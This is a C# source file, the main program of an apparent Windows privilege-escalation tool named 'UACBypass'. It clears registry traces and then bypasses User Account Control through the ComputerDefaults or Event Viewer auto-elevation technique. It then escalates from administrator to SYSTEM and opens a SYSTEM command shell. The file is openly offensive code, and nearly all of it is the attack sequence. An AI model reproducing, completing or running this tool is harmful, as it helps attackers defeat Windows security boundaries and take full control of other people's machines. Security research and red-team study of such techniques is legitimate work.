using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
namespace UACBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                Console.Title = "Bypass UAC Program @R�giolis 2022";

                UAC.CleanRegistry();

                Console.WriteLine("running as admin? " + (Privileges.IsRunningAsAdmin() ? "yes" : "no"));
                Console.WriteLine("running as system? " + (Privileges.IsRunningAsSystem() ? "yes" : "no"));

                if (!Privileges.IsRunningAsAdmin())
                {
                    Console.WriteLine("=> Privileges Escalation");
                    Console.WriteLine("Bypassing UAC....");

                    //make a privilege escalation to get admin rights
                    if (UAC.IsUACDisabled()) UAC.RestartAsAdmin();
                    else
                    {
                        string filename = System.Reflection.Assembly.GetExecutingAssembly().Location + (args.Length > 0 ? " " + args[0] : null);

                        if (OsSupport.IsEightOrBetter)
                            UAC.BypassUsingComputerDefaults(filename);
                        else UAC.BypassUsingEventViewer(filename);
                    }
                }
                else if (Privileges.IsRunningAsSystem())
                {
                    Console.WriteLine("sucessfully bypass all Windows Privileges");

                    //check if the username
                    Process p = new Process();
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.FileName = "whoami";
                    p.Start();
                    p.WaitForExit();
                    Console.WriteLine(p.StandardOutput.ReadToEnd());

                    //start a new windows shell
                    Process.Start("cmd.exe");
                }
                else
                {
                    Console.WriteLine("=> System Privileges Escalation");

                    //make a privilege escalation to get system rights (works only if is already running as admin), so we need to run as admin first.
                    if(args.Length > 0) Privileges.ElevateToSystem(args[0]);
                    else Privileges.ElevateToSystem(System.Reflection.Assembly.GetExecutingAssembly().Location);
                }
            }
            catch(Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Error: " +  ex.Message);
                Console.ReadKey();
            }
        }
    }
}
